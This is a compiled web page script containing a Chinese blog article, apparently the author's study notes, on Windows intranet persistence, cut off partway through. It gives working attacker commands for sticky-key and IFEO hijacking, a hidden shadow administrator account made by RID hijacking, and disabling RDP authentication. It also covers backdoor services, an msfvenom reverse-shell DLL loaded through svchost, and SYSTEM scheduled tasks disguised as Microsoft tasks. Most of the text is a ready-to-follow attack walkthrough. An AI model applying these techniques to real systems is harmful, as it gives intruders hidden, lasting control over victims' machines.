import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as n}from"./app-DS0ZCcmM.js";const l="/articles/assets/shift-rdp-win-BVFP2Lfc.png",t={};function h(p,i){return n(),a("div",null,i[0]||(i[0]=[e(`<h1 id="内网权限持久化" tabindex="-1"><a class="header-anchor" href="#内网权限持久化"><span>内网权限持久化</span></a></h1><h2 id="辅助功能镜像劫持" tabindex="-1"><a class="header-anchor" href="#辅助功能镜像劫持"><span>辅助功能镜像劫持</span></a></h2><h3 id="shift后门" tabindex="-1"><a class="header-anchor" href="#shift后门"><span>shift后门</span></a></h3><p>利用windows的辅助功能进行后门</p><p>最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>屏幕键盘： C:\\Windows\\System32\\osk.exe</span></span>
<span class="line"><span>放大镜： C:\\Windows\\System32\\Magnify.exe</span></span>
<span class="line"><span>旁白： C:\\Windows\\System32\\Narrator.exe</span></span>
<span class="line"><span>显示切换器 C:\\Windows\\System32\\DisplaySwitch.exe</span></span>
<span class="line"><span>应用切换器： C:\\Windows\\System32\\AtBroker.exe</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在windows的古早版本中，我们可以使用copy命令来使用cmd命令覆盖sethc.exe文件(我理解的后门是将这里更换为自己免杀过的木马文件)</p><p>或许你在尝试时会遇到拒绝访问这样的问题</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_faild.png" alt="shift_faild" tabindex="0" loading="lazy"><figcaption>shift_faild</figcaption></figure><p>这种情况需要把当前目录的所有文件改为管理员组</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>takeown  /f  c:\\windows\\system32\\*.*  /a  /r  /d  y  # 获取整个文件夹及其下面子目录文件的所属权</span></span>
<span class="line"><span>cacls c:\\windows\\system32\\*.* /T /E /G administrators:F # 将所有c:\\windows\\system32\\目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制(删除原有NTFS权限设置)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_win.png" alt="shift_win" tabindex="0" loading="lazy"><figcaption>shift_win</figcaption></figure><p>成功覆盖该文件，当连续按5次shif时，会导致该漏洞</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_try.png" alt="shift_try" tabindex="0" loading="lazy"><figcaption>shift_try</figcaption></figure><p>会开启一个cmd命令行，对其他辅助工具的运用思路基本一致，攻击者可以通过在远程的桌面连接按5下shift，即可获得一个命令行，如果有SYSTEM权限，我们即可RDP HIJacking</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/shift-rdp-hijiacking.png" alt="shift-rdp-hijiacking" tabindex="0" loading="lazy"><figcaption>shift-rdp-hijiacking</figcaption></figure><p>执行tscon 1即可不需要任何凭据登录到administrator<img src="`+l+`" alt="shift-rdp-win" loading="lazy"></p><h3 id="映像劫持-ifeo" tabindex="-1"><a class="header-anchor" href="#映像劫持-ifeo"><span>映像劫持(IFEO)</span></a></h3><h4 id="what-is-ifeo" tabindex="-1"><a class="header-anchor" href="#what-is-ifeo"><span>What is IFEO</span></a></h4><p>IFEO 是 Windows 操作系统中的一个功能，它代表 &quot;Image File Execution Options&quot;（图像文件执行选项）。IFEO 允许开发人员对可执行文件进行调试和修改，以实现各种调试和兼容性方面的目的。</p><p>通过 IFEO，可以为特定的可执行文件或进程指定调试器或其他注入程序。当目标可执行文件或进程启动时，系统会检查是否存在与其相关联的 IFEO 条目。如果存在，则系统会启动指定的调试器或注入程序，并将其附加到目标进程上。</p><p>注意：使用IFEO最低权限需要管理员权限或等效的权限</p><h5 id="debugger" tabindex="-1"><a class="header-anchor" href="#debugger"><span>Debugger</span></a></h5><ul><li>利用</li></ul><p>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。</p><ul><li>可视化手动修改</li></ul><p>手动修改注册表，添加debugger字段</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/debugger_by_hand.png" alt="debugger_by_hand" tabindex="0" loading="lazy"><figcaption>debugger_by_hand</figcaption></figure><p>启动该程序时就会启动cmd</p><h5 id="globalflag" tabindex="-1"><a class="header-anchor" href="#globalflag"><span>GlobalFlag</span></a></h5><p>在Windows中，关于程序的静默退出监视（Silent Exit Monitoring）是指对正在运行的程序进行实时监控，并在程序退出时自动采取相应的操作，而无需人工干预或弹出任何用户界面。</p><p>IFEO还可以在指定程序静默退出时启动任意监控程序，可以通过设置注册表来达到该效果</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#启动对记事本的静默退出监视，需要在CurrentVersion注册一个GlobalFlag</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> GlobalFlag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 512</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#启动windows错误的进程报告WerFault.exe,它将成为reverse_tcp.exe的父进程</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ReportingMode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将监视器进程设置为reverse_tcp.exe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> MonitorProcess</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\Windows\\System32\\reverse_tcp.exe&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当用户关闭已开启的记事本时，会启动WerFault进程，它的子进程为我们设定的的后门程序。修改为cmd.exe可以更直观的看到</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/werfaylt-cmd.png" alt="werfaylt-cmd" tabindex="0" loading="lazy"><figcaption>werfaylt-cmd</figcaption></figure><h2 id="常见系统后门技术" tabindex="-1"><a class="header-anchor" href="#常见系统后门技术"><span>常见系统后门技术</span></a></h2><h3 id="创建影子账户" tabindex="-1"><a class="header-anchor" href="#创建影子账户"><span>创建影子账户</span></a></h3><p>影子账户其实就是隐藏起来的账户，只能在注册表中看到该账户的信息，对于该账户的创建，我们需要拥有管理员权限</p><ul><li><p>执行下列命令创建hacker$账户</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>net user hacker$ hacker@123 /add</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>$代表创建的账号是隐藏账户，无法从命令行直接查询，此时创建的账户为标准用户，需要修改注册表来使其获得管理员权限</p><p>将hacker$用户添加到管理员组中</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>net localgroup administrators hacker$ /add</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>用注册表中administrator对应的000001F4中F的值替换hacker$用户对应的值</p></li></ul><p>​ <img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/reg-F-tihuan.png" alt="reg-F-tihuan" loading="lazy"></p><p>该过程其实是hacker$用户劫持了administrator用户的RID,达到完全控制的目的</p><ul><li><p>导出注册表</p><p>将Name下的hacker$用户导出，并导出对应的二进制值表</p></li><li><p>删除hacker$用户</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>net user hacker$ /del</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>此时在命令行和用户组中都看不到hacker$用户了</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/looklook-user.png" alt="looklook-user" tabindex="0" loading="lazy"><figcaption>looklook-user</figcaption></figure></li></ul><p>​ 双击导出的注册表，将值重新添加到表中</p><p>​ 但是我们可以通过<code>net user hacker$</code>来查看hacker$用户的信息</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/shadow-user.png" alt="shadow-user" tabindex="0" loading="lazy"><figcaption>shadow-user</figcaption></figure><p>至此影子用户创建完成</p><h4 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h4><p>远程登录，此时登录会收到限制，需要在控制主机上手动添加允许连接(远程连接需要关闭鉴权和防火墙)</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/remote-user-add.png" alt="remote-user-add" tabindex="0" loading="lazy"><figcaption>remote-user-add</figcaption></figure><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">REG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ADD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SecurityLayer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #关闭鉴权</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">netsh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> advfirewall</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> firewall</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> rule</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> name=&quot;Remote Desktop&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> protocol=TCP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> dir=in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> localport=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">3389</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> action=allow</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #配置防火墙允许连接</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="系统服务后门" tabindex="-1"><a class="header-anchor" href="#系统服务后门"><span>系统服务后门</span></a></h3><h4 id="新建系统服务" tabindex="-1"><a class="header-anchor" href="#新建系统服务"><span>新建系统服务</span></a></h4><p>将二进制文件路径设置为服务启动值，并将系统服务设置为自启动，当服务或系统重启时，服务会执行二进制文件</p><ul><li><p>执行以下命令，添加系统服务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sc create Backdoor binpath= &quot;cmd.exe /K c:\\reverse_tcp.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</span></span>
<span class="line"><span>#start:设置启动模式为自动</span></span>
<span class="line"><span>#obj : 指定启动类型，指启动服务的权限</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>当系统重启或服务重启时就会执行指定的exe</p></li></ul><p>(感觉和横向中利用系统服务进行横向是一个方法，只不过运用的场景不同，启动的权限和目的不同)</p><h4 id="利用现有的系统服务" tabindex="-1"><a class="header-anchor" href="#利用现有的系统服务"><span>利用现有的系统服务</span></a></h4><p>通过<code>sc config</code>命令修改服务的binpath值，或是修改注册表中ImagePath选项来指定目标二进制文件</p><h4 id="利用svchost-exe加载" tabindex="-1"><a class="header-anchor" href="#利用svchost-exe加载"><span>利用svchost.exe加载</span></a></h4><p>在Windows操作系统中，svchost.exe（Service Host）是一个关键的系统进程，它负责托管和运行多个服务.每个svchost.exe进程加载一个或多个DLL文件，这些文件包含实际的服务代码。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/svchost-rpc.png" alt="svchost-rpc" tabindex="0" loading="lazy"><figcaption>svchost-rpc</figcaption></figure><p>-k RPCSS标识该服务属于RPCSS组，在子注册表parameters下能够看到调用的dll文件</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/svchost-parameters.png" alt="svchost-parameters" tabindex="0" loading="lazy"><figcaption>svchost-parameters</figcaption></figure><p>当服务启动时，就会加载对应的dll文件,并根据dll文件提供对应的服务</p><p>svchost.exe中需要启动的服务都要到</p><p><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Winodws NT\\CurrentVersion\\Svchost</code>表下注册</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/regedic_svchsot.png" alt="regedic_svchsot" tabindex="0" loading="lazy"><figcaption>regedic_svchsot</figcaption></figure><p>攻击者可以通过svchost.exe加载恶意dll文件，具有较高的隐蔽性</p><ul><li><p>通过msf生成恶意dll文件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.131 LHOST=4444 -f dll -o msf.dll</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>将生成的DLL文件上传到目标主机system32目录下并执行以下命令注册服务</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#创建名为backdoor的服务，以svchost加载的方式启动，服务分组为RDPCS</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Backdoor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> binpath=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\Windows\\System32\\svchost.exe -k RDPCS&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> start=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> obj=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LocalSystem</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将Backdoor的服务启动时加载的dll文件改为msf.dll</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKEY_LOCAL_MACHINE</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ervices</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ackdoor</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\P</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">arameters</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ServiceDll</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_EXPAND_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;c:\\Windows\\System32\\msf.dll&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#配置服务描述</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKEY_LOCAL_MACHINE</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ervices</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ackdoor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Description</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;windows xxx service&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#配置服务显示名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKEY_LOCAL_MACHINE</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ervices</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ackdoor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DisplayName</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Backdoor&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#创建新的服务分组RDPCS，并将Backdoor添加进去(注册服务)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> netsvc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG-MULTI_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Backdoor</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当系统重启时，会得到shell</p></li></ul><h3 id="计划任务后门" tabindex="-1"><a class="header-anchor" href="#计划任务后门"><span>计划任务后门</span></a></h3><p>通过创建计划任务，使目标机器定时执行我们上传的后门文件，执行下列命令，在目标主机上创建计划任务</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /Create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Backdoor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /SC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> daily</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 08:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /MO</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> c:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">indows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ystem32</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">everse_tcp.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /RU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> System</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>该命令通过创建名为Backdoor的计划任务，每天早上8点以SYSTEM权限执行一遍隐藏的shell脚本</p><p>注意：以 SYSTEM权限运行服务，就要有管理员权限</p><p>执行下列命令，创建一个每60秒执行的计划任务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>schtasks /Create /TN Backdoor /SC minute /MO 1 /TR c:\\windows\\system32\\reverse_tcp.exe /RU System /F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>关于计划任务管理库：windows下计算机管理中，计划任务管理库内的计划任务是以类似文件夹中文件的形式存在的，为了提高计划任务的隐蔽性，我们最好是遵守这个规则</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /Create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TN</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">icrosoft</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">indows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ppTask</span><span 